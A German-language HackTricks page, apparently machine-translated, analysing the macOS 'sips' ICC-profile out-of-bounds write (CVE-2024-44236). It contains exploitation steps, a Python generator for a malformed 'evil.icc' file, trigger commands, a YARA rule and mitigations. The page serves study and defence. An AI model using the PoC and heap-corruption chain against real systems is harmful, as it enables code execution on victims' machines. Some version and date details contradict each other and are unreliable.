# WWW2Exec - sips ICC-Profil Out-of-Bounds Write (CVE-2024-44236)

{{#include ../../banners/hacktricks-training.md}}

## Übersicht

Eine Out-of-Bounds **Zero-Write**-Schwachstelle im ICC-Profil-Parser des **Scriptable Image Processing System** (`sips`) von Apple macOS (macOS 15.0.1, `sips-307`) ermöglicht es einem Angreifer, Heap-Metadaten zu beschädigen und die primitive Ausführung in vollständige Codeausführung zu pivotieren. Der Fehler befindet sich in der Verarbeitung des `offsetToCLUT`-Feldes der `lutAToBType` (`mAB `) und `lutBToAType` (`mBA `) Tags. Wenn Angreifer `offsetToCLUT == tagDataSize` setzen, löscht der Parser **16 Bytes über das Ende des Heap-Puffers hinaus**. Heap-Spraying ermöglicht es dem Angreifer, Allokatorstrukturen oder C++-Zeiger auf Null zu setzen, die später dereferenziert werden, was eine **arbitrary-write-to-exec**-Kette ergibt (CVE-2024-44236, CVSS 7.8).

> Apple hat den Fehler in macOS Sonoma 15.2 / Ventura 14.7.1 (30. Oktober 2024) gepatcht. Eine zweite Variante (CVE-2025-24185) wurde am 1. April 2025 in macOS 15.5 und iOS/iPadOS 18.5 behoben.

## Verwundbarer Code
```c
// Pseudocode extracted from sub_1000194D0 in sips-307 (macOS 15.0.1)
if (offsetToCLUT <= tagDataSize) {
// BAD ➜ zero 16 bytes starting *at* offsetToCLUT
for (uint32_t i = offsetToCLUT; i < offsetToCLUT + 16; i++)
buffer[i] = 0;            // no bounds check vs allocated size!
}
```
## Exploitation Steps

1. **Erstellen Sie ein bösartiges `.icc`-Profil**

* Richten Sie einen minimalen ICC-Header (`acsp`) ein und fügen Sie einen `mAB ` (oder `mBA `) Tag hinzu.
* Konfigurieren Sie die Tag-Tabelle so, dass der **`offsetToCLUT` der Tag-Größe** (`tagDataSize`) entspricht.
* Platzieren Sie von Angreifern kontrollierte Daten direkt nach dem Tag, sodass die 16 Nullschreibvorgänge die Metadaten des Allokators überschreiben.

2. **Auslösen des Parsens mit einer beliebigen sips-Operation, die das Profil berührt**

```bash
# Verifizierungspfad (keine Ausgabedatei erforderlich)
sips --verifyColor evil.icc
# oder implizit beim Konvertieren von Bildern, die das Profil einbetten
sips -s format png payload.jpg --out out.png
```

3. **Heap-Metadaten-Korruption ➜ willkürliches Schreiben ➜ ROP**
Im standardmäßigen **`nano_zone`-Allokator** von Apple leben die Metadaten für 16-Byte-Slots **unmittelbar nach** dem ausgerichteten 0x1000-Slab. Indem das Tag des Profils am Ende eines solchen Slabs platziert wird, überschreiben die 16 Nullschreibvorgänge `meta->slot_B`. Nach einem anschließenden `free` wird der vergiftete Zeiger in die kleine Freiliste eingereiht, wodurch der Angreifer **ein gefälschtes Objekt an einer beliebigen Adresse allokieren** und einen C++-vtable-Zeiger, der von sips verwendet wird, überschreiben kann, wodurch die Ausführung schließlich zu einer ROP-Kette wechselt, die im bösartigen ICC-Puffer gespeichert ist.

### Schneller PoC-Generator (Python 3)
```python
#!/usr/bin/env python3
import struct, sys

HDR = b'acsp'.ljust(128, b'\0')          # ICC header (magic + padding)
TAGS = [(b'mAB ', 132, 52)]              # one tag directly after header
profile  = HDR
profile += struct.pack('>I', len(TAGS))  # tag count
profile += b''.join(struct.pack('>4sII', *t) for t in TAGS)

mab = bytearray(52)                      # tag payload (52 bytes)
struct.pack_into('>I', mab, 44, 52)      # offsetToCLUT = size (OOB start)
profile += mab

open('evil.icc', 'wb').write(profile)
print('[+] Wrote evil.icc (%d bytes)' % len(profile))
```
### YARA-Erkennungsregel
```yara
rule ICC_mAB_offsetToCLUT_anomaly
{
meta:
description = "Detect CLUT offset equal to tag length in mAB/mBA (CVE-2024-44236)"
author       = "HackTricks"
strings:
$magic = { 61 63 73 70 }          // 'acsp'
$mab   = { 6D 41 42 20 }          // 'mAB '
$mba   = { 6D 42 41 20 }          // 'mBA '
condition:
$magic at 0 and
for any i in (0 .. 10):           // up to 10 tags
(
($mab at 132 + 12*i or $mba at 132 + 12*i) and
uint32(132 + 12*i + 4) == uint32(132 + 12*i + 8) // offset == size
)
}
```
## Auswirkungen

Das Öffnen oder Verarbeiten eines manipulierten ICC-Profils führt zu einer **willkürlichen Codeausführung** im Kontext des aufrufenden Benutzers (Vorschau, QuickLook, Safari-Bilddarstellung, Mail-Anhänge usw.), wodurch Gatekeeper umgangen wird, da das Profil in ansonsten harmlosen Bildern (PNG/JPEG/TIFF) eingebettet werden kann.

## Erkennung & Minderung

* **Patch!** Stellen Sie sicher, dass der Host macOS ≥ 15.2 / 14.7.1 (oder iOS/iPadOS ≥ 18.1) ausführt.
* Setzen Sie die oben genannte YARA-Regel an E-Mail-Gateways und EDR-Lösungen ein.
* Entfernen oder bereinigen Sie eingebettete ICC-Profile mit `exiftool -icc_profile= -overwrite_original <file>` vor der weiteren Verarbeitung von nicht vertrauenswürdigen Dateien.
* Härtung von Vorschau/QuickLook, indem Sie sie in sandboxed „Transparenz & Modernisierung“ VMs ausführen, wenn Sie unbekannte Inhalte analysieren.
* Für DFIR suchen Sie nach der kürzlichen Ausführung von `sips --verifyColor` oder `ColorSync`-Bibliotheksladungen durch sandboxed Apps im einheitlichen Protokoll.

## Referenzen

* Trend Micro Zero Day Initiative advisory ZDI-24-1445 – “Apple macOS ICC Profile Parsing Out-of-Bounds Write Remote Code Execution (CVE-2024-44236)”
https://www.zerodayinitiative.com/advisories/ZDI-24-1445/
* Apple-Sicherheitsupdates HT213981 “Über den Sicherheitsinhalt von macOS Sonoma 15.2”
https://support.apple.com/en-us/HT213981

{{#include ../../banners/hacktricks-training.md}}
